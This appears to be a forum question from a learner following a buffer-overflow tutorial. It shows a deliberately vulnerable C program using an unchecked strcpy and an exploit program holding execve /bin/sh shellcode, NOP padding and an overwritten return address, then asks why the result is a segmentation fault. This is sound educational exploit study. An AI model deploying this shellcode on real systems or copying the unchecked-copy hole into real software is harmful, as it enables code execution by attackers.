  "content": "I'm following the video here: https://www.youtube.com/watch?v=N0DBu3TGejI\n\nExploitMe.c\n\n```\n#include<stdio.h>\n#include<string.h>\n\nmain(int argc, char **argv)\n{\n        char buffer[80];\n\n        strcpy(buffer, argv[1]);\n\n        return 1;\n}\n\n```\nHackYou.c\n\n```\n#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\n\n// shellcode ripped from http://www.milw0rm.com/shellcode/444\n\nchar shellcode[]=\n\"\\x31\\xc0\"                      // xorl         %eax,%eax\n\"\\x50\"                          // pushl        %eax\n\"\\x68\\x6e\\x2f\\x73\\x68\"          // pushl        $0x68732f6e\n\"\\x68\\x2f\\x2f\\x62\\x69\"          // pushl        $0x69622f2f\n\"\\x89\\xe3\"                      // movl         %esp,%ebx\n\"\\x99\"                          // cltd\n\"\\x52\"                          // pushl        %edx\n\"\\x53\"                          // pushl        %ebx\n\"\\x89\\xe1\"                      // movl         %esp,%ecx\n\"\\xb0\\x0b\"                      // movb         $0xb,%al\n\"\\xcd\\x80\"                      // int          $0x80\n;\n\nchar retaddr[] = \"\\x08\\xf3\\xff\\xbf\";\n\n#define NOP 0x90\n\n\nmain()\n{\n        char buffer[96];\n\n        memset(buffer, NOP, 96);\n\n        memcpy(buffer, \"EGG=\", 4);\n\n        memcpy(buffer+4, shellcode, 24);\n\n        memcpy(buffer+88, retaddr, 4);\n        memcpy(buffer+92, \"\\x00\\x00\\x00\\x00\", 4);\n\n        putenv(buffer);\n\n        system(\"/bin/sh\");\n\n        return 0;\n\n}\n\n```\nI run ./HackYou, in that environment there is an enviroment variable named $EGG that is used as an argument to the ExploitMe.c. $EGG contains: 24 bytes shell code, 60 bytes nop, and 4 bytes to override the RET address for a total of 88 bytes (Buffer + EBP + RET)\n\nThis screenshot contains the information you need to know:\n\n\n\nOn ExploitMe.c, I break on line 8. The first thing I print is the stack. 0x00881d36 is the RET address.  \n\nThen I print argv1, as you can see it is 22 words. It will overwrite the Buffer+EBP+RET exactly. The start of the buffer variable is at 0xbffff308 (ESP+8), so I add that into the end of the payload. \n\nThen I step. The RET has been perfectly overwritten with the buffer memory address.\n\nIt should return to the beginning of the buffer and start executing my shell code. All seems fine to me, but instead of giving me a shell, it gives me a segmentation fault. \n\nWhat's going on? \n\nThank you.\n\n",
